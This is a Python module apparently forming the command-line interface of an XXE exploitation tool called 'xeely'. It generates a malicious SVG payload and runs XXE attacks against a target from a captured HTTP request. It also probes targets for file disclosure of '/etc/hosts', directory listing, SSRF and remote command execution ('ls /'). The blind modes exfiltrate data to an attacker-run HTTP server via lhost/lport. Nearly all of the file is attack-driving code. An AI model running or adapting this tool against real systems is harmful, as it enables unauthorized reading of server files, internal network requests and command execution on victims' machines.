import os
from pathlib import Path
from typing import Optional

import typer
from typer import Typer

from xeely import __app_name__
from xeely import console
from xeely import RESOURCES_PATH
from xeely.cli import helper
from xeely.cli import options
from xeely.custom_http import HTTPRequest
from xeely.custom_http.server import HTTPServerParams
from xeely.custom_http.server import run_http_server
from xeely.custom_xml import XML
from xeely.xxe.attack.handler.factory import attack_handler_factory
from xeely.xxe.attack.mode import XXEAttackMode
from xeely.xxe.attack.payload import payload_factory
from xeely.xxe.attack.payload.direct import PLACE_HOLDER
from xeely.xxe.attack.type import XXEAttackType

app = Typer()


@app.command()
def svg(
    cdata: bool = options.cdata_option,
    base64: bool = options.base64_option,
    file=options.file_option,
    dir=options.dir_option,
    ssrf=options.ssrf_option,
    rce=options.rce_option,
    out: Path = typer.Option(".", help="The path to the directory where to save the payload"),
    lhost=options.get_lhost_option(),
    lport: int = options.lport_option,
):
    attack_type, resource = options.get_attack_type_and_resource_from_options(file, dir, ssrf, rce)

    raw_svg = f"""
<svg>
{PLACE_HOLDER}
</svg>
    """

    xml = XML.parse_string(raw_svg)

    if lhost != "":
        http_server_params = HTTPServerParams(lhost=lhost, lport=lport)
    else:
        http_server_params = None

    payload_generator = payload_factory.get_payload_generator_for_mode(
        XXEAttackMode.DIRECT,
        base_xml=xml,
        resource=resource,
        attack_type=attack_type,
        should_apply_base64_encoding=base64,
        should_use_cdata=cdata,
        http_server_params=http_server_params,
    )
    payload = payload_generator.generate_payload()

    payload_path = out / "xxe.svg"
    console.print_info(f"Saving payload in {payload_path}")

    with open(payload_path, "w") as file:
        file.write(payload)

    if cdata:
        dtd_path = out / payload_generator.get_dtd_file_name()
        console.print_info(f"Saving DTD file in {dtd_path}")

        with open(dtd_path, "w") as file:
            file.write(payload_generator.get_dtd_content())
        console.print_info("Don't forget to expose an HTTP server for the attack to work.")


@app.command()
def exploit(
    cdata: bool = options.cdata_option,
    base64: bool = options.base64_option,
    mode: XXEAttackMode = options.mode_option,
    url_encoded: bool = options.urlencode_option,
    request: typer.FileText = options.request_option,
    file=options.file_option,
    dir=options.dir_option,
    ssrf=options.ssrf_option,
    rce=options.rce_option,
    lhost=options.get_lhost_option(is_required=False),
    lport: int = options.lport_option,
):
    request_data = request.read()
    http_request = HTTPRequest.parse_request(request_data)

    attack_type, resource = options.get_attack_type_and_resource_from_options(file, dir, ssrf, rce)

    # Checking lhost for blind attacks
    if mode != XXEAttackMode.DIRECT and lhost == "":
        raise typer.BadParameter("You forgot to specify a value for the 'lhost' option")

    if lhost:
        http_server_params = HTTPServerParams(lhost=lhost, lport=lport)
    else:
        http_server_params = None

    attack_handler = attack_handler_factory.get_attack_handler_for_mode(
        mode,
        **helper.get_constructor_params(
            mode=mode,
            http_request=http_request,
            http_server_params=http_server_params,
            xml_urlencoded=url_encoded,
            attack_type=attack_type,
            should_apply_base64_encoding=base64,
            should_use_cdata=cdata,
            resource=resource,
        ),
    )
    console.print_info(f"Running {attack_type.value} attack using {mode.value} mode")
    data = attack_handler.run_attack()

    if data == "":
        console.print_warning("No content retrieved from target machine")
    else:
        console.show_exfiltrated_data_in_table(data)


VULNERABILITIES_TEST = {
    XXEAttackType.FILE_DISCLOSURE.value: {"resource": "/etc/hosts"},
    XXEAttackType.DIRECTORY_LISTING.value: {"resource": "/"},
    XXEAttackType.SSRF.value: {"resource": ""},
    XXEAttackType.RCE.value: {"resource": "ls /"},
}


@app.command()
def identify(
    url_encoded: bool = options.urlencode_option,
    request: typer.FileText = options.request_option,
    file: bool = typer.Option(
        True, help="Verify if the target machine is vulnerable to file disclosure attack"
    ),
    dir: bool = typer.Option(
        True, help="Verify if the target machine is vulnerable to directory listing attack"
    ),
    ssrf: bool = typer.Option(
        True, help="Verify if the target machine is vulnerable to SSRF attack"
    ),
    rce: bool = typer.Option(True, help="Verify if the target machine is vulnerable to RCE attack"),
    lhost=options.get_lhost_option(is_required=True),
    lport: int = options.lport_option,
):
    request_data = request.read()
    http_request = HTTPRequest.parse_request(request_data)

    # Determining the type of attacks to check
    attacks_to_check = []

    if file:
        attacks_to_check.append(XXEAttackType.FILE_DISCLOSURE)
    if dir:
        attacks_to_check.append(XXEAttackType.DIRECTORY_LISTING)
    if ssrf:
        attacks_to_check.append(XXEAttackType.SSRF)
    if rce:
        attacks_to_check.append(XXEAttackType.RCE)

    # Getting the params for HTTP server
    http_server_params = HTTPServerParams(lhost=lhost, lport=lport)

    # Updating the SSRF resource and writing the test file
    ssrf_file_name = "ssrf.txt"
    ssrf_file_path = RESOURCES_PATH / ssrf_file_name
    
    if not RESOURCES_PATH.exists():
        os.mkdir(RESOURCES_PATH)
    
    with open(ssrf_file_path, "w") as file_io:
        file_io.write(__app_name__)

    VULNERABILITIES_TEST[XXEAttackType.SSRF.value][
        "resource"
    ] = f"{http_server_params.get_base_url()}/{ssrf_file_name}"

    valid_mode: Optional[XXEAttackMode] = None
    valid_attacks = []

    for mode in XXEAttackMode:
        console.print_info(f"Testing if we could exploit XXE attacks using {mode.value} strategy.")
        attack_handler = attack_handler_factory.get_attack_handler_for_mode(
            mode,
            **helper.get_constructor_params(
                mode=mode,
                http_request=http_request,
                http_server_params=http_server_params,
                xml_urlencoded=url_encoded,
                resource="",
            ),
        )

        for attack_type in attacks_to_check:
            console.print_info(f"Testing {attack_type.value} attack")
            attack_handler.change_attack_type(attack_type)
            attack_handler.change_resource(VULNERABILITIES_TEST[attack_type.value]["resource"])

            if mode == XXEAttackMode.DIRECT and attack_type == XXEAttackType.SSRF:
                with run_http_server(lhost=lhost, lport=lport):
                    data = attack_handler.run_attack()
            else:
                data = attack_handler.run_attack()

            if data != "":
                valid_mode = mode
                valid_attacks.append(attack_type)
                console.print_info(f"Target machine is vulnerable to {attack_type.value} attacks!")
            else:
                console.print_warning(
                    f"Target machine is not vulnerable to {attack_type.value} "
                    f"attacks using {mode.value} mode"
                )

        if valid_mode:
            break

    if valid_mode:
        mode_in_green_color = console.transform_message_to_be_displayed_in(
            message=valid_mode.value, color="green"
        )

        summary = f"You can use {mode_in_green_color} mode to perform: "
        summary += ",".join(
            [
                console.transform_message_to_be_displayed_in(message=attack.value, color="green")
                for attack in valid_attacks
            ]
        )
        summary += " attacks"

        console.print_info(summary)
    else:
        console.print_warning("It seems that the target machine is not vulnerable to XXE attacks.")

    os.remove(ssrf_file_path)
    os.rmdir(RESOURCES_PATH)
